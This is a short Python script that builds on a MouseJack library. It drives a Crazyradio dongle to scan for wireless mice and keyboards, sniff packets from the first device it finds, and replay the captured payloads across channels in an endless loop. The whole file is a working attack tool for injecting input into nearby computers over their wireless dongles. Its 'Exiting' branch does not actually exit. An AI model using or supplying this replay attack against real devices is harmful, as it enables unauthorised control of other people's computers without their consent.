from __future__ import annotations

from six import iteritems
from Mousejack import MouseJack


class Replayer(MouseJack):
    def __init__(self):
        super().__init__()

    def activate_replay(self, targets):
        for address, target in iteritems(targets):
            payload = list(target['payload'])
            channels = target['channels']
            address = target['address']

            self.crazy_radio.activate_sniffer_mode(address)

            payload_hex = ':'.join(f'{byte:02X}' for byte in payload)
            print(payload_hex)

            for channel in channels:
                self.crazy_radio.set_channel(channel)
                self.crazy_radio.send_payload(payload)


if __name__ == '__main__':
    mj = Replayer()
    count = 0
    while count < 2:
        mj.scan()
        if mj.devices:
            first_device_address = list(mj.devices.keys())[0]
            print(f"Sniffing device with address: {first_device_address}")
            mj.sniff(0.1, first_device_address)
            count += 1

            device_info = mj.devices[first_device_address]
            print(device_info)
        else:
            print("No devices detected. Exiting.")

    if mj.devices:
        while True:
            mj.activate_replay(mj.devices)
